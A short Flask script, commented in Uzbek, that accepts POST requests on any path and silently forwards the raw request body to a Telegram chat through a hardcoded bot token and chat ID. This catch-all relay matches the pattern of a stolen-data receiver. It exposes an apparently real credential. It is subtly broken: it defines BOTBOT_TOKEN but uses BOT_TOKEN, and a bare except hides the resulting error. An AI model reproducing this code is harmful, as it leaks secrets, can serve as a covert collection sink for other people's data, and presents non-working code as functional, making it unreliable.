from flask import Flask, request
import requests
import json

app = Flask(__name__)

BOTBOT_TOKEN = '8341944003:AAF_Q_-t5347BNi3aYgACYtB3BteAixHp34'
CHAT_ID = '1232455326'

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    if request.method == 'POST':
        try:
            # Terminal yuborgan xom ma'lumotni olish
            raw_data = request.get_data(as_text=True)
            
            # Ma'lumot juda uzun bo'lishi mumkin, shuning uchun kesib olamiz
            # va Telegramga shunchaki matn qilib yuboramiz
            debug_msg = f"DEBUG DATA:\n{raw_data[:3500]}" 
            
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": debug_msg}
            )
        except:
            pass
            
    return "OK", 200